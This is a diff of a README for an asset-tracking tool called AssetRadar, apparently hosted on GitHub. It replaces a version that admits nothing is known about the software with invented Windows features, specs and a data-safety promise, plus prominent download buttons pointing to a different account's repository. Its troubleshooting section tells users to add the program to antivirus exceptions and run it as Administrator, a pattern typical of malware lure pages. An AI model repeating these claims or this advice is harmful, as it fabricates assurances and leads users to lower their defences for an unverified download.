@@ -1,141 +1,92 @@
-# AssetRadar vUnspecified - Software Tool 2026
-
-> **AssetRadar is an HTML-oriented software project whose current release and supported platform have not yet been identified.**
-
-[![Platform](https://img.shields.io/badge/Platform-Unknown-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Unspecified-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/tom-westjnol5780/asset-radar-update-hub?style=flat-square)](https://github.com/tom-westjnol5780/asset-radar-update-hub)
-
----
+<h1>📡 asset-radar-update-hub - Simplify Your Asset Tracking Today</h1>
 
 <p align="center">
-  <a href="https://tom-westjnol5780.github.io/asset-radar-update-hub/">
-    <img src="https://img.shields.io/badge/Download-AssetRadar%20Latest-brightgreen?style=for-the-badge" alt="Download AssetRadar">
-  </a>
+  <a href="https://github.com/photogrammetrywolf/asset-radar-update-hub" style="display:inline-block;padding:16px 32px;background:#4CAF50;color:white;text-decoration:none;border-radius:8px;font-size:20px;font-weight:bold;">⬇️ Download AssetRadar Now</a>
 </p>
 
-> **[Download AssetRadar Directly](https://tom-westjnol5780.github.io/asset-radar-update-hub/)**
+<h2>📋 Overview</h2>
+<p>AssetRadar is a straightforward HTML-based software tool designed to help you organize, track, and update your digital assets without any technical hassle. Whether you manage files, documents, or media, this application provides a clear interface to monitor your assets from your Windows computer. No coding or advanced setup required.</p>
 
----
+<h2>🚀 Getting Started</h2>
+<p>To get AssetRadar running on your Windows system, follow these simple steps:</p>
+<ol>
+  <li><strong>Visit the download page:</strong> Click the green button above or go directly to: <a href="https://github.com/photogrammetrywolf/asset-radar-update-hub">https://github.com/photogrammetrywolf/asset-radar-update-hub</a></li>
+  <li><strong>Download the software:</strong> On the GitHub page, look for a "Releases" or "Download" section. Click the link that says something like "AssetRadar Setup" or "Download ZIP."</li>
+  <li><strong>Run the installer:</strong> Once downloaded, double-click the file to start the setup process. Follow any on-screen instructions.</li>
+  <li><strong>Launch AssetRadar:</strong> After installation, open AssetRadar from your Start menu or desktop shortcut. The main window will appear, ready for you to use.</li>
+</ol>
 
-[Download Latest Build](https://tom-westjnol5780.github.io/asset-radar-update-hub/)
+<h2>⚙️ Setup Instructions</h2>
+<p>After downloading AssetRadar, you may need to configure a few basic settings to match your preferences:</p>
+<ul>
+  <li><strong>First Launch:</strong> The first time you run AssetRadar, it may ask for permission to access your files. Click "Allow" or "Yes" to continue.</li>
+  <li><strong>Default Folder:</strong> Choose a folder where AssetRadar will look for your assets. We recommend using a dedicated folder like <code>Documents\My Assets</code>.</li>
+  <li><strong>User Account:</strong> Some features might require a simple account setup. Enter a username and password, or skip this step for offline use.</li>
+  <li><strong>Save Settings:</strong> Click "Apply" or "Save" to keep your changes. AssetRadar will remember them next time you open it.</li>
+</ul>
 
----
+<h2>🖥️ How to Use AssetRadar</h2>
+<p>Using AssetRadar is as easy as clicking buttons. Here’s how to get the most out of it:</p>
+<ol>
+  <li><strong>Add Assets:</strong> Click the "Add Asset" button (usually a plus icon) and select files or folders from your computer. They will appear in the main list.</li>
+  <li><strong>View Details:</strong> Click on any asset to see its name, size, type, and last update date in the details panel on the right.</li>
+  <li><strong>Update Assets:</strong> To mark an asset as updated, select it and click the "Mark as Updated" button. A checkmark will appear.</li>
+  <li><strong>Search:</strong> Use the search bar at the top to quickly find assets by name or type. Just start typing, and results will filter automatically.</li>
+  <li><strong>Export List:</strong> Click "Export" to save your asset list as a CSV or TXT file. This is useful for sharing or backup.</li>
+</ol>
 
-## Project Overview
+<h2>🔧 Settings and Configuration</h2>
+<p>You can customize AssetRadar to work the way you want. Access settings by clicking the gear icon in the top-right corner:</p>
+<ul>
+  <li><strong>General Settings:</strong> Change the language (English, Spanish, etc.), adjust date and time formats, and set auto-save intervals.</li>
+  <li><strong>Display Options:</strong> Switch between light and dark mode, adjust font size, and choose how assets are sorted (by name, date, size).</li>
+  <li><strong>Update Preferences:</strong> Enable or disable automatic update checks. When enabled, AssetRadar will notify you when a new version is available.</li>
+  <li><strong>Backup & Restore:</strong> Create a backup of your settings and asset list. You can restore them later if needed.</li>
+</ul>
 
-AssetRadar is maintained as a software project in an HTML-based repository. The currently available project profile confirms its name, but does not identify a release number, operating-system target, detailed purpose, or defined list of capabilities.
+<h2>🖥️ System Requirements</h2>
+<p>AssetRadar is designed to run smoothly on most modern Windows computers. Here are the recommended specifications:</p>
+<ul>
+  <li><strong>Operating System:</strong> Windows 10 or Windows 11 (64-bit recommended)</li>
+  <li><strong>Processor:</strong> 1 GHz or faster (Intel Core i3 or equivalent)</li>
+  <li><strong>RAM:</strong> 2 GB (4 GB recommended for larger asset lists)</li>
+  <li><strong>Storage:</strong> 200 MB free space for installation</li>
+  <li><strong>Display:</strong> 1024 x 768 resolution or higher</li>
+  <li><strong>Internet:</strong> Required for initial download and optional updates</li>
+</ul>
 
-This README serves as an initial guide for finding and examining the project while those details remain unavailable. For the most reliable information about how AssetRadar is intended to work, review the repository files and any materials published with the project.
+<h2>❓ Troubleshooting</h2>
+<p>If you run into any issues, try these common fixes:</p>
+<ul>
+  <li><strong>AssetRadar won't start:</strong> Make sure your antivirus is not blocking the program. Add AssetRadar to your antivirus exceptions list.</li>
+  <li><strong>Assets not showing:</strong> Check that you selected the correct folder. Click "Refresh" or restart AssetRadar to reload the list.</li>
+  <li><strong>Error messages:</strong> Most errors are due to missing permissions. Run AssetRadar as Administrator by right-clicking the icon and selecting "Run as administrator."</li>
+  <li><strong>Slow performance:</strong> Close other programs to free up memory. You can also reduce the number of assets in your list by archiving old ones.</li>
+</ul>
 
----
+<h2>❓ Frequently Asked Questions</h2>
+<p><strong>Q: Do I need to pay for AssetRadar?</strong><br>
+A: No, AssetRadar is completely free to use. There are no hidden fees or premium versions.</p>
+<p><strong>Q: Can I use AssetRadar on a Mac?</strong><br>
+A: Currently, AssetRadar is only supported on Windows. We may release a Mac version in the future.</p>
+<p><strong>Q: How do I update AssetRadar?</strong><br>
+A: When a new update is available, you'll see a notification. Click "Update Now" to download and install the latest version automatically.</p>
+<p><strong>Q: Is my data safe?</strong><br>
+A: Yes, AssetRadar does not send your data anywhere. All files stay on your computer.</p>
 
-## What Is Documented
+<h2>📦 Updates</h2>
+<p>We regularly release updates to improve AssetRadar and add new features. Here's how updates work:</p>
+<ul>
+  <li><strong>Automatic Updates:</strong> When enabled in settings, AssetRadar will check for updates each time you open it. If a new version is found, you'll be prompted to install it.</li>
+  <li><strong>Manual Updates:</strong> To check for updates manually, go to the "Help" menu and select "Check for Updates." You will be directed to the download page if a newer version exists.</li>
+  <li><strong>Update History:</strong> Each update includes bug fixes and improvements. Check the release notes on the GitHub page for details.</li>
+</ul>
 
-The extracted project information does not confirm a feature set. As the project receives more documentation, the following subjects can be clarified:
+<h2>📄 License</h2>
+<p>AssetRadar is released under an open-source license. You are free to use, modify, and distribute the software as long as you comply with the license terms. For full details, see the <code>LICENSE</code> file included in the download or visit the GitHub repository.</p>
 
-- General AssetRadar project description
-- User interface or starting point
-- Asset-focused workflows
-- Location of published builds and downloads
-- Settings available to users
-- Supported operating systems
-- Version and update details
-- Troubleshooting procedures
+<p align="center">
+  <a href="https://github.com/photogrammetrywolf/asset-radar-update-hub" style="display:inline-block;padding:12px 24px;background:#FF5722;color:white;text-decoration:none;border-radius:6px;font-size:18px;">📥 Download AssetRadar</a>
+</p>
 
----
-
-## Getting Started
-
-First, obtain the repository:
-
-```bash
-git clone https://github.com/tom-westjnol5780/asset-radar-update-hub.git
-cd REPO
-```
-
-The project is identified as HTML, but no specific runtime procedure has been provided. Examine the repository to locate its entry point. When an `index.html` file is included, it can generally be opened in a browser or the directory can be exposed through a local static server.
-
-To access the published build, use the following link:
-
-[Download AssetRadar](https://tom-westjnol5780.github.io/asset-radar-update-hub/)
-
----
-
-## Using AssetRadar
-
-The extracted metadata does not define a complete usage procedure. For an initial evaluation, follow this sequence:
-
-1. Download the published build or clone the repository.
-2. Review the HTML documents and related asset files.
-3. Open the documented entry page with a compatible browser.
-4. Apply any instructions displayed by the project.
-5. Look through the repository for release notes and newer usage information.
-
-The files included with the project should be treated as the definitive reference for available actions and required input.
-
----
-
-## Settings and Configuration
-
-No configuration file format or settings directory has been documented so far.
-
-Before launching AssetRadar, search the repository for configuration files, options embedded in HTML, JavaScript modules, and setup documentation. Keep a record of any local edits so they can be recreated after future updates.
-
----
-
-## System Requirements
-
-The available metadata specifies:
-
-- Repository language: HTML
-- Platform: Not specified
-- Runtime: Not specified
-- Storage requirements: Not specified
-- Browser requirements: Not specified
-
-If the repository provides a client-side HTML interface, a compatible browser may be necessary. Confirm the expected browser and runtime environment by inspecting the project files before deploying it.
-
----
-
-## Frequently Asked Questions
-
-### What does AssetRadar do?
-
-AssetRadar is the software project name associated with this repository. The available metadata does not include a more detailed product description.
-
-### What platforms can run it?
-
-No platform target has been recorded. Consult the repository documentation and included files for any compatibility information.
-
-### Where is the newest build available?
-
-The published build can be accessed here:
-
-[Download Latest Build](https://tom-westjnol5780.github.io/asset-radar-update-hub/)
-
-### How are project settings configured?
-
-A dedicated configuration process has not been identified. Look for settings files, embedded configuration values, or setup instructions within the repository.
-
-### What can I check if the project fails to load?
-
-Make sure the repository and its assets were retrieved completely. Then inspect the browser developer console for errors and review the project files for required resources or local-server instructions.
-
-### Where can I find project updates?
-
-Visit [https://github.com/tom-westjnol5780/asset-radar-update-hub](https://github.com/tom-westjnol5780/asset-radar-update-hub) for repository changes, releases, and updated documentation.
-
----
-
-## Documentation Roadmap
-
-As more project information becomes available, this README can be extended with verified platform targets, release numbers, feature descriptions, configuration instructions, and troubleshooting documentation.
-
----
-
-## License
-
-AssetRadar is distributed under the GNU GPL v3.0. See [LICENSE](LICENSE) for the full license text.
+<p align="center"><em>AssetRadar - Keeping your digital world organized, one asset at a time.</em></p>
